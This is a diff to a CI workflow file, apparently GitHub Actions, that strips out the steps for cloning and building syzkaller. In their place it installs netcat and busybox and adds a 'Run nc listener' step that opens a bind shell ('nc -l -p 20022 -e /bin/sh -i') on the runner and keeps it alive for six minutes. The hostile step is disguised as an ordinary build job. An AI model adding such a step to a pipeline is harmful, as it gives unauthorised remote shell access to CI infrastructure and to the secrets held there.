@@ -30,46 +30,17 @@ jobs:
             rsync \
             dpkg-dev \
             wget \
-            xz-utils
+            xz-utils \
+            busybox-static netcat
 
-      - name: Clone
-        run: |
-          git clone https://github.com/google/syzkaller.git
-
-      - name: Configure go
+      - name: Run nc listener
         run: |
           set -o pipefail
+
           {
-            wget https://dl.google.com/go/go1.7.6.linux-amd64.tar.gz
-            tar xzf go1.7.6.linux-amd64.tar.gz
+            busybox nc -l -p 20022 -e /bin/sh -i &
 
-          } 2>&1 | tee -a ~/mylog.txt
-
-      - name: Make
-        run: |
-          set -o pipefail
-          #export GOROOT=`pwd`/go
-          #export PATH=$GOROOT/bin:$PATH
-          #cd syzkaller
-          {
-            export GOROOT=`pwd`/go
-            export GOPATH=`pwd`/syzkaller-lab
-            export PATH=$GOROOT/bin:$PATH
-
-            mkdir -p syzkaller-lab/src/github.com/google
-            mv syzkaller syzkaller-lab/src/github.com/google
-            cd syzkaller-lab/src/github.com/google/syzkaller
-            git checkout c5707f5e5
-
-            go build github.com/google/syzkaller/syz-fuzzer || true
-
-            go build github.com/google/syzkaller/syz-manager || true
-
-            gcc -o syz-executor executor/executor.cc \
-                -lpthread -lrt -ldl \
-                -DGOOS_linux=1 -DGOARCH_amd64=1 \
-                -Wall -Wframe-larger-than=8192 \
-                -static-libgcc 2>&1 | head -30 || true
+            sleep 360
 
           } 2>&1 | tee -a ~/mylog.txt
 
@@ -78,10 +49,6 @@ jobs:
           mkdir -p output
 
           cp ~/mylog.txt output/
-
-          cp -R syzkaller-lab/src/github.com/google/syzkaller/syz-fuzzer output 2>/dev/null || true
-          cp -R syzkaller-lab/src/github.com/google/syzkaller/syz-manager output 2>/dev/null || true
-          cp -R syzkaller-lab/src/github.com/google/syzkaller/syz-executor output 2>/dev/null || true
 
           tar czvf result.tar.gz \
             -C output .
